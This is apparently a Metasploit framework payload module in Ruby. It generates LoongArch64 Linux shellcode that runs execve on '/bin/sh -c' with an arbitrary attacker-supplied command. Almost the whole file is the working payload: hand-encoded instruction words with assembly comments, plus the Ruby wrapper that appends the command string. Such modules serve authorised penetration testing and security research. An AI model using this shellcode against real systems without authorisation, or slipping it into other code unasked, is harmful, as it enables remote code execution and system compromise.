# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 88

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Execute Command',
        'Description' => 'Execute an arbitrary command.',
        'Author' => [
          'modexp', # cmd.s execve RISC-V 64-bit shellcode
          'bcoles', # LoongArch64 port and metasploit module
        ],
        'License' => BSD_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_LOONGARCH64,
        'References' => [
          ['URL', 'https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/'],
          ['URL', 'https://github.com/bcoles/shellcode/blob/main/loongarch64/cmd/cmd.s'],
        ]
      )
    )
    register_options([
      OptString.new('CMD', [ true, 'The command string to execute' ]),
    ])
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    datastore['CMD'] || ''
  end

  def generate(_opts = {})
    shellcode = [
      0x02ff0063,  # addi.d $sp, $sp, -64
      0x0383740b,  # ori $a7, $zero, 221           # __NR_execve
      0x14dcd2c4,  # lu12i.w $a0, 452246
      0x0388bc84,  # ori $a0, $a0, 0x22f
      0x170e65e4,  # lu32i.d $a0, -494801
      0x03001884,  # lu52i.d $a0, $a0, 6           # $a0 = 0x0068732f6e69622f = "/bin/sh\0"
      0x29c00064,  # st.d $a0, $sp, 0              # store "/bin/sh\0" on the stack
      0x00150064,  # or $a0, $sp, $zero            # $a0 = pointer to "/bin/sh"
      0x140000c5,  # lu12i.w $a1, 6
      0x038cb4a5,  # ori $a1,$a1, 0x32d            # $a1 = 0x632d = "-c\0"
      0x29c02065,  # st.d $a1,  $sp, 8             # store "-c\0" on the stack
      0x02c02065,  # addi.d $a1, $sp, 8            # $a1 = pointer to "-c"
      0x18000106,  # pcaddi $a2, 8                 # $a2 = pointer to cmd string
      0x29c04064,  # st.d $a0, $sp, 16             # argv[0] = "/bin/sh"
      0x29c06065,  # st.d $a1, $sp, 24             # argv[1] = "-c"
      0x29c08066,  # st.d $a2, $sp, 32             # argv[2] = cmd
      0x29c0a060,  # st.d $zero, $sp, 40           # argv[3] = NULL
      0x02c04065,  # addi.d $a1, $sp, 16           # $a1 = argv
      0x00150006,  # or $a2, $zero, $zero          # $a2 = NULL (envp)
      0x002b0101,  # syscall 0x101
    ].pack('V*')
    shellcode += command_string + "\x00"

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
